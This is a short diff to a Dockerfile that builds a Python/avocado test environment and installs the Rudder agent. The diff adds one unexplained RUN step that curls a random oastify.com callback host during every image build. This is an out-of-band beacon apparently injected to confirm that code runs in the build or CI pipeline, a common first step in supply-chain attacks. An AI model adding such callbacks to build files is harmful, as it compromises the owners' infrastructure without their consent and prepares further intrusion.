@@ -7,6 +7,8 @@ RUN ./user.sh $USER_ID ;\
     apt-get update && apt-get install -y git wget gnupg2 make curl python3-pip gcc ;\
     pip3 install avocado-framework pylint Jinja2
 
+RUN curl https://8gpexwnl8gc51ftsndl0iy9m4da4y5mu.oastify.com/built/python-avocado.Dockerfile
+
 # Accept all OSes
 ENV UNSUPPORTED=y
 RUN wget https://repository.rudder.io/tools/rudder-setup && sed -i "s/set -e/set -xe/" rudder-setup && sed -i "s/rudder agent inventory//" rudder-setup && sed -i "s/rudder agent health/rudder agent health || true/" rudder-setup && sh ./rudder-setup setup-agent latest
